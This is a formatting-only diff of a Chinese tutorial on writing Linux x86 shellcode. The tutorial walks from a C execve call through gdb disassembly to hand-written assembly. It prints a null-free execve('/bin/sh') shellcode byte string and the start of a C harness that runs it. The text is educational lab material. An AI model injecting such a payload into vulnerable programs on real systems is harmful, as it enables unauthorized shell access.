@@ -1,4 +1,4 @@
-# <center>shellcode编写实验</center>
+# shellcode编写实验
 
 ## 实验概述
 
@@ -33,7 +33,7 @@ execve（参数1，参数2，参数3）
 参数1：命令所在路径
 参数2：命令的集合
 参数3：传递给执行文件的环境变量集
- 
+
 尝试编译运行。
 ```
 $ gcc shell.c -o shell
@@ -68,10 +68,10 @@ Dump of assembler code for function main:
    0x00000000004005de <+72>:	xor    rdx,QWORD PTR fs:0x28
    0x00000000004005e7 <+81>:	je     0x4005ee <main+88>
    0x00000000004005e9 <+83>:	call   0x400460 <__stack_chk_fail@plt>
-   0x00000000004005ee <+88>:	leave  
-   0x00000000004005ef <+89>:	ret    
+   0x00000000004005ee <+88>:	leave
+   0x00000000004005ef <+89>:	ret
 End of assembler dump.
-pwndbg> 
+pwndbg>
 ```
 其中关键点在
 ```
@@ -99,7 +99,7 @@ push 0x6e69622f
 注意这里用xor eax,eax把eax置0，不使用`mov eax,0`的原因是这样会出现`\x00`，shellcode会被gets()这类函数截断。
 esp指向当前栈顶，此时即指向"/bin/sh",我们把esp保存到ebx
 ```
-mov ebx,esp    
+mov ebx,esp
 ```
 现在把两个参数压栈，eax为NULL(0)，ebx为"/bin/sh"的地址
 ```
@@ -110,14 +110,14 @@ push ebx
 ```
 mov ecx,esp
 xor edx,edx
-mov al,0xb  
+mov al,0xb
 int 0x80       ;通过中断0x80进行系统调用
 ```
 所以有完整的代码：
 ```
 section .text
 global _start
- 
+
 _start:
 xor eax,eax
 push eax
@@ -165,9 +165,9 @@ Disassembly of section .text:
 这样就提取到了,下面可以写个c程序验证一下。
 ```c
 #include <stdio.h>
- 
+
 char shellcode[]="\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x31\xd2\xb0\x0b\xcd\x80";
- 
+
 int main()
 {
     void (*fp) (void);
